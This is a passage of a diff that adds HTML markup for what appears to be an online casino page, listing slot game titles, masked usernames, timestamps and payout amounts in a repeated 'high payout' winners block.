+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                9900.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Boxing King</div>
+                              <div class="row highPayoutTextSmall no-gutters">minas*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:48:00</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2009.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Fruity Bonanza
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">jahidvi*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:47:46</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                5060.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">3 Hot Chillies...
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">mdja*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:47:32</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                6450.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace
+                                Deluxe...
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">bash*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:47:22</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2172.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace
+                                Deluxe...
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">saindi*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:47:07</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                4710.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Boxing King</div>
+                              <div class="row highPayoutTextSmall no-gutters">4912*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:47:07</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2293.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Money Coming
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">s*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:47:03</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2450.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">8899ziau*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:46:59</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2937.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">zisa*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:46:56</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters">
+                                <img src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                3563.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Money Coming
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">a*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:46:41</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters">
+                                <img src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                5410.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Fortune Gems 3...
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">nirobs*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:46:16</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters">
+                                <img src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2950.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Circus Delight
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">mehe*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:45:58</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters">
+                                <img src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                6364.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">skshi*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:45:56</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2270.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Fortune Coins
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">mann*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:45:56</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2300.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Wild Bounty
+                                Showdown...</div>
+                              <div class="row highPayoutTextSmall no-gutters">md018509*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:45:56</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                3092.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Wings of
+                                Iguazu...
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">sumo*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:45:33</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2920.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Elemental Link
+                                Fire...</div>
+                              <div class="row highPayoutTextSmall no-gutters">tuhins*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:45:31</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2125.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Wild Bandito
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">mintu*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:45:19</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2134.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Money Coming
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">asifu*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:45:12</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2100.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Laughing Buddha
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">sabbi*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:45:12</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                7020.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Fortune Gems 2...
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">skb*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:45:03</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                3550.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">iqb*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:44:48</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2008.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">ridoyho*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:44:44</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2536.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Mafia Mayhem
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">mdmuk*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:44:38</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                5361.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">013367*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:44:23</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2877.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Super Ace</div>
+                              <div class="row highPayoutTextSmall no-gutters">abdu*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:44:05</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                4270.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Mahjong Ways
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">ismai*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:44:04</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2121.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Wild Bounty
+                                Showdown...</div>
+                              <div class="row highPayoutTextSmall no-gutters">tohr*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:43:59</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                8408.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Mahjong Ways
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">se*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:43:54</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2076.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Boxing King</div>
+                              <div class="row highPayoutTextSmall no-gutters">munsur*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:43:52</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2815.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Fortune Gems 2...
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">dipufe*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:43:47</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                3280.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
+                            <div class="v-card__title d-flex flex-column align-start justify-end text-white pa-0">
+                              <div class="v-image v-responsive highPayout_game_icon theme--light">
+                                <div class="v-image__image v-image__image--preload v-image__image--cover"
+                                  style="background-position: center center;"></div>
+                                <div class="v-responsive__content"></div>
+                              </div>
+                              <div class="row highPayoutTextBig font-weight-bold no-gutters pt-2 pb-2">Wild Bandito
+                              </div>
+                              <div class="row highPayoutTextSmall no-gutters">ras*****</div>
+                              <div class="row highPayoutTextSmall no-gutters" style="color: rgb(255, 131, 2);">
+                                2025-04-04
+                                22:43:37</div>
+                              <div class="row highPayoutTextBig d-flex justify-center align-center no-gutters"><img
+                                  src="https://gamius88.github.io/page/cashIcon.svg" width="12" height="12">
+                                2356.00
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="winningRecordColumn col">
+                          <div tabindex="0" class="pa-2 highPayoutColumn v-card v-card--link v-sheet theme--light">
